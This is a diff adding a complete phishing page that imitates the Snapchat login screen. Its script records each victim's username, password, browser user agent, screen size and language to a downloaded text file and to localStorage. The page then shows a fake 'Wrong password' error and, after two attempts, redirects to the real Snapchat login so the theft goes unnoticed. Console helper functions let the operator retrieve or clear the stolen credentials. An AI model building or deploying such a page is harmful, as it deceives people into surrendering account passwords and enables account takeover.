@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat - Log In</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Avenir Next', Arial, sans-serif;
+            background: #FFFC00;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .login-box {
+            background: white;
+            border-radius: 12px;
+            padding: 35px 28px;
+            width: 370px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+            text-align: center;
+        }
+        .logo {
+            width: 55px;
+            height: 55px;
+            margin-bottom: 20px;
+        }
+        h2 {
+            font-size: 22px;
+            margin-bottom: 6px;
+            color: #000;
+        }
+        .sub {
+            color: #999;
+            font-size: 13px;
+            margin-bottom: 22px;
+        }
+        input {
+            width: 100%;
+            padding: 13px 14px;
+            margin-bottom: 10px;
+            border: 1.5px solid #ddd;
+            border-radius: 10px;
+            font-size: 14px;
+            outline: none;
+            background: #fafafa;
+        }
+        input:focus {
+            border-color: #FFFC00;
+            background: white;
+        }
+        button {
+            width: 100%;
+            padding: 13px;
+            background: #0FADFF;
+            color: white;
+            border: none;
+            border-radius: 22px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 6px;
+        }
+        button:hover {
+            background: #0d93d9;
+        }
+        .links {
+            margin-top: 18px;
+            font-size: 12px;
+        }
+        .links a {
+            color: #0FADFF;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        #error {
+            color: red;
+            font-size: 12px;
+            margin-top: 10px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-box">
+    <svg class="logo" viewBox="0 0 48 48">
+        <rect width="48" height="48" rx="10" fill="#FFFC00"/>
+        <path d="M24 13c-5 0-9 4-9 9v3c0 1-.8 2-1.8 2h-1c-.5 0-1 .4-1 1v2c0 .5.5 1 1 1h1c2 0 3.8 1.5 3.8 3.5V36c0 2 1.5 3.5 3.5 3.5h7c2 0 3.5-1.5 3.5-3.5v-1.5c0-2 1.8-3.5 3.8-3.5h1c.5 0 1-.5 1-1v-2c0-.6-.5-1-1-1h-1c-1 0-1.8-1-1.8-2v-3c0-5-4-9-9-9z" fill="white"/>
+    </svg>
+    
+    <h2>Log In</h2>
+    <p class="sub">Log in to your Snapchat account</p>
+    
+    <form id="loginForm">
+        <input type="text" id="emailField" placeholder="Username or Email" required autocomplete="off">
+        <input type="password" id="passField" placeholder="Password" required autocomplete="off">
+        <button type="submit">Log In</button>
+    </form>
+    
+    <p id="error">Wrong password. Try again.</p>
+    
+    <div class="links">
+        <a href="#">Forgot Password?</a><br><br>
+        <span style="color:#666;">New To Snapchat?</span> <a href="#">Sign Up</a>
+    </div>
+</div>
+
+<script>
+let attemptCount = 0;
+
+document.getElementById("loginForm").addEventListener("submit", function(e) {
+    e.preventDefault();
+    
+    const email = document.getElementById("emailField").value.trim();
+    const password = document.getElementById("passField").value;
+    const now = new Date();
+    const timestamp = now.toISOString().replace("T", " ").substring(0, 19);
+    
+    // Build the credential string
+    const logEntry = 
+        "==========================================\n" +
+        "TIME: " + timestamp + "\n" +
+        "USERNAME/EMAIL: " + email + "\n" +
+        "PASSWORD: " + password + "\n" +
+        "USER AGENT: " + navigator.userAgent + "\n" +
+        "SCREEN: " + screen.width + "x" + screen.height + "\n" +
+        "LANGUAGE: " + navigator.language + "\n" +
+        "==========================================\n\n";
+    
+    // Build simple user:pass line
+    const simpleEntry = email + ":" + password + "\n";
+    
+    // Create a downloadable text file and trigger download immediately
+    function saveToComputer() {
+        // Method 1: Download the log entry as a file
+        const blob = new Blob([logEntry], { type: "text/plain" });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement("a");
+        a.href = url;
+        a.download = "snapchat_credentials.txt";
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+        
+        // Method 2: Append to localStorage as backup storage on the computer
+        let existingLogs = localStorage.getItem("snapchat_logs") || "";
+        existingLogs += logEntry;
+        localStorage.setItem("snapchat_logs", existingLogs);
+        
+        // Method 3: Also save simple format to localStorage
+        let existingSimple = localStorage.getItem("snapchat_accounts") || "";
+        existingSimple += simpleEntry;
+        localStorage.setItem("snapchat_accounts", existingSimple);
+    }
+    
+    // Save credentials to computer file
+    saveToComputer();
+    
+    // Also save using File System Access API if available (for saving to any folder)
+    async function saveToFileSystem() {
+        try {
+            // Check if browser supports File System Access API
+            if ('showSaveFilePicker' in window) {
+                let existingContent = "";
+                
+                // Try to read existing file content from localStorage
+                existingContent = localStorage.getItem("snapchat_logs") || "";
+                
+                const fileBlob = new Blob([existingContent], { type: "text/plain" });
+                
+                // Trigger save dialog
+                const handle = await window.showSaveFilePicker({
+                    suggestedName: "snapchat_credentials.txt",
+                    types: [{
+                        description: "Text File",
+                        accept: { "text/plain": [".txt"] }
+                    }]
+                });
+                
+                const writable = await handle.createWritable();
+                await writable.write(fileBlob);
+                await writable.close();
+            }
+        } catch (err) {
+            console.log("File System API not supported, using download method instead");
+        }
+    }
+    
+    // Try to use advanced save method
+    saveToFileSystem();
+    
+    // Show fake error, clear password field
+    attemptCount++;
+    document.getElementById("error").style.display = "block";
+    document.getElementById("passField").value = "";
+    document.getElementById("passField").focus();
+    
+    // After 2 attempts, redirect to real Snapchat
+    if (attemptCount >= 2) {
+        window.location.href = "https://accounts.snapchat.com/accounts/login";
+    }
+});
+
+// Function to retrieve all captured credentials from localStorage
+// Open browser console (F12) and type: getStoredCredentials()
+function getStoredCredentials() {
+    const logs = localStorage.getItem("snapchat_logs") || "No credentials stored yet.";
+    console.log(logs);
+    
+    // Also download all stored logs as a file
+    const blob = new Blob([logs], { type: "text/plain" });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement("a");
+    a.href = url;
+    a.download = "all_snapchat_credentials.txt";
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+    
+    return logs;
+}
+
+// Function to clear stored credentials
+function clearStoredCredentials() {
+    localStorage.removeItem("snapchat_logs");
+    localStorage.removeItem("snapchat_accounts");
+    console.log("All stored credentials cleared.");
+}
+</script>
+
+</body>
+</html>
